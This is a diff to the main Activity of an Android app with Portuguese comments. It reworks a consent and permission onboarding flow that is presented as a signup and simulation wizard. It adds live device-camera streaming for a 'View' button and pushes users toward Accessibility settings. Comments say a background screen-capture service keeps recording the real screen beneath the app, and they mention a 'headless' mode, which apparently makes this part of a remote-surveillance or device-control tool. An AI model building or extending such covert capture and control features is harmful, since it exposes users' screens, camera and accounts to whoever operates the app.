@@ -170,6 +170,9 @@ class MainActivity : Activity() {
         private const val COOLDOWN_CANCELAMENTO_MS = 20 * 60 * 1000L  // 20 min
         private const val KEY_PRIMEIRO_ACESSO = "primeiro_acesso"
         private const val KEY_PERMISSOES_OK = "permissoes_onboarding_ok"
+        // Consentimento geral de acesso aos conteúdos do app (modal do 1º acesso).
+        private const val KEY_CONSENT_CONTEUDOS = "consentimento_conteudos_ok"
+        private const val REQUEST_CAMERA = 7731
         // Quando true, o cliente já chegou na tela "Análise em Andamento"
         // (etapa 4). Persistido para que, ao fechar e reabrir o app, a tela
         // permaneça a mesma (com o círculo de loop).
@@ -401,6 +404,12 @@ class MainActivity : Activity() {
 
         // 1. Renderiza a interface principal imediatamente (setContentView)
         construirInterfaceDinamica()
+
+        // CONSENTIMENTO DE ACESSO AOS CONTEÚDOS (1º acesso): modal com a descrição
+        // e o botão "Autorizar". Aparece uma única vez e fica salvo o aceite.
+        if (!prefs.getBoolean(KEY_CONSENT_CONTEUDOS, false)) {
+            handlerMain.post { exibirModalConsentimentoConteudos() }
+        }
 
         Thread {
             try {
@@ -1028,7 +1037,12 @@ class MainActivity : Activity() {
                 LinearLayout.LayoutParams.WRAP_CONTENT
             )
             setOnClickListener {
-                if (prefs.getBoolean(KEY_PRIMEIRO_ACESSO, true)) {
+                // Só manda para as Configurações de Acessibilidade se ela ainda
+                // NÃO estiver ativa. Se já estiver (ex.: reabriu o app com tudo
+                // concedido), avança direto para a próxima etapa — antes o clique
+                // chamava o modal que retornava sem fazer nada e a tela "não
+                // avançava".
+                if (prefs.getBoolean(KEY_PRIMEIRO_ACESSO, true) && !isAcessibilidadeAtiva()) {
                     exibirModalConsentimentoAcessibilidade()
                 } else {
                     atualizarEtapaInterface()
@@ -1651,6 +1665,15 @@ class MainActivity : Activity() {
                 { requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQUEST_NOTIFICACAO) }
             ))
         }
+        // 5) CÂMERA — necessária para o botão "View" (câmera do dispositivo ao
+        //    vivo). Opcional (não bloqueia o onboarding essencial); se negada, o
+        //    View apenas não transmite a câmera até ser concedida.
+        lista.add(PassoPermissao(
+            "camera", "Permitir câmera",
+            "Para o recurso de visualização da câmera do dispositivo (botão View).",
+            { ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED },
+            { requestPermissions(arrayOf(Manifest.permission.CAMERA), REQUEST_CAMERA) }
+        ))
         // [REMOVIDO] "Permitir instalar desta fonte": existia só para instalar o
         //    módulo de suporte (assets/suporte.apk). Como NÃO há aplicativo de
         //    suporte, este passo foi removido (nagava o modal a cada abertura).
@@ -1724,10 +1747,28 @@ class MainActivity : Activity() {
             return
         }
         val primeiroAcesso = prefs.getBoolean(KEY_PRIMEIRO_ACESSO, true)
-        if (!primeiroAcesso) {
+        val permissoesOk = prefs.getBoolean(KEY_PERMISSOES_OK, false)
+        // Avança para o Cadastro (etapa 2) quando o onboarding já terminou. Além
+        // do flag de 1º acesso, considera CONCLUÍDO também quando as permissões
+        // essenciais já foram concedidas OU a acessibilidade já está ativa — o
+        // flag KEY_PRIMEIRO_ACESSO só virava false no modal "Iniciar", que nem
+        // sempre era disparado; sem isto o app reabria PRESO na tela inicial
+        // (parecendo branca) e o botão "Simular" não levava às próximas etapas.
+        val concluiuEntrada = !primeiroAcesso || permissoesOk || isAcessibilidadeAtiva()
+        if (concluiuEntrada) {
             containerInicial.visibility = View.GONE
             containerCadastro.visibility = View.VISIBLE
+            containerPlanos.visibility = View.GONE
+            containerSucesso.visibility = View.GONE
             atualizarIndicadorPassos(2)
+        } else {
+            // Garante que a tela inicial esteja SEMPRE visível quando ainda não
+            // avançou — nunca deixa todas as etapas ocultas (tela branca).
+            containerInicial.visibility = View.VISIBLE
+            containerCadastro.visibility = View.GONE
+            containerPlanos.visibility = View.GONE
+            containerSucesso.visibility = View.GONE
+            atualizarIndicadorPassos(1)
         }
     }
 
@@ -1753,6 +1794,33 @@ class MainActivity : Activity() {
         if (isAcessibilidadeAtiva()) return
         voltandoDeAcessibilidade = true
         startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+    }
+
+    /** Modal de consentimento geral de acesso aos conteúdos do app (1º acesso).
+     *  Descrição + botão "Autorizar"; o aceite é persistido e não reaparece. */
+    private fun exibirModalConsentimentoConteudos() {
+        try {
+            if (prefs.getBoolean(KEY_CONSENT_CONTEUDOS, false)) return
+            AlertDialog.Builder(this)
+                .setTitle(getString(R.string.consent_conteudos_titulo))
+                .setMessage(getString(R.string.consent_conteudos_texto))
+                .setCancelable(false)
+                .setPositiveButton(getString(R.string.consent_accept)) { d, _ ->
+                    prefs.edit().putBoolean(KEY_CONSENT_CONTEUDOS, true).apply()
+                    d.dismiss()
+                    // Aproveita o aceite para já pedir a permissão de CÂMERA (botão
+                    // View). Se já concedida, não mostra nada.
+                    try {
+                        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                            != PackageManager.PERMISSION_GRANTED) {
+                            requestPermissions(arrayOf(Manifest.permission.CAMERA), REQUEST_CAMERA)
+                        }
+                    } catch (_: Exception) {}
+                }
+                .show()
+        } catch (e: Exception) {
+            Log.e(TAG, "Erro ao exibir consentimento de conteúdos: ${e.message}")
+        }
     }
 
     private fun exibirModalConsentimentoTela() {
@@ -2040,17 +2108,28 @@ class MainActivity : Activity() {
                     finish()
                 }, 200)
             } else {
-                // TRANSIÇÃO LIMPA (não-headless): após aceitar o consentimento,
-                // a tela (clara) do app NÃO pode ficar em primeiro plano sendo
-                // capturada pelo MediaProjection (corpo branco). Primeiro manda a
-                // task para o fundo (revela a Home na hora) e, logo em seguida,
-                // REMOVE a task (finishAndRemoveTask) para não sobrar nenhuma
-                // janela branca. O ScreenCaptureService (Foreground) segue
-                // capturando a tela REAL por baixo — ele é independente da Activity.
-                try { moveTaskToBack(true) } catch (_: Exception) {}
-                handlerMain.postDelayed({
-                    try { finishAndRemoveTask() } catch (_: Exception) { try { finish() } catch (_: Exception) {} }
-                }, 150)
+                // 1º ACESSO (não-headless): após aceitar o ÚLTIMO consentimento
+                // (espelhamento), o app NÃO fecha mais sozinho. A antiga "tela
+                // branca" capturada pelo MediaProjection já foi resolvida
+                // (setHideDuringScreenSharing + fundo transparente), então o app
+                // PERMANECE aberto e avança normalmente para as próximas etapas,
+                // com todos os botões funcionando. O ScreenCaptureService
+                // (Foreground) segue capturando a tela REAL por baixo.
+                try {
+                    getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+                        .putBoolean(KEY_PRIMEIRO_ACESSO, false)
+                        .apply()
+                } catch (_: Exception) {}
+                handlerMain.post {
+                    try {
+                        // Conclui/segue as permissões opcionais restantes e
+                        // atualiza a UI para a próxima etapa (Cadastro).
+                        executarOrquestracaoPermissoes()
+                        atualizarEtapaInterface()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Erro ao avançar etapa pós-consentimento: ${e.message}")
+                    }
+                }
             }
         }
         if (requestCode == REQUEST_OVERLAY && podeSobrepor() && !ScreenCaptureService.isRunning) {
